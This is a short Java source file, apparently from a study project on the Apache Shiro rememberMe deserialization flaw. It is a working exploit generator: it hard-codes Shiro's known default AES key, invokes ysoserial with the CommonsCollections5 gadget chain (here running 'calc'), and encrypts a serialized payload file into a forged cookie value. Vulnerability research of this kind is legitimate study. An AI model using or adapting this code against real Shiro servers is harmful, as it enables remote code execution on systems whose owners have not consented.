package summersec.shirodemo.Payload;


import cn.hutool.core.io.FileUtil;
import cn.hutool.core.io.file.FileReader;
import cn.hutool.core.util.HexUtil;
import org.apache.shiro.codec.Base64;
import summersec.shirodemo.Encrypt.CbcEncrypt;
import summersec.shirodemo.Encrypt.Encrypt;

import java.io.File;
import java.io.IOException;


/**
 * @ClassName: Payload
 * @Description: TODO
 * @Author: Summer
 * @Date: 2021/1/16 15:08
 * @Version: v1.0.0
 * @Description:
 **/
public class Payload {

    public static void main(String[] args) throws Exception {
        //yes
        String key = "kPH+bIxk5D2deZiIxcaaaA==";
        byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");

        // ysoserial.jar 路径
        String ysoserial = "D:\\Tools\\反序列化\\ysoserial-0.0.6-SNAPSHOT-all.jar";

        String CMD = "java -jar " + ysoserial + " CommonsCollections5 calc";
//        String payload = new Tools().exeCmd(CMD);
        FileReader fileReader = new FileReader("E:\\Soures\\JavaLearnVulnerability\\shiro\\shiro-deser\\tempfile2");
        CbcEncrypt cbcEncrypt = new CbcEncrypt();
        System.out.println(cbcEncrypt.encrypt(key,fileReader.readBytes()));


//        System.out.println(new String(p));









    }


}
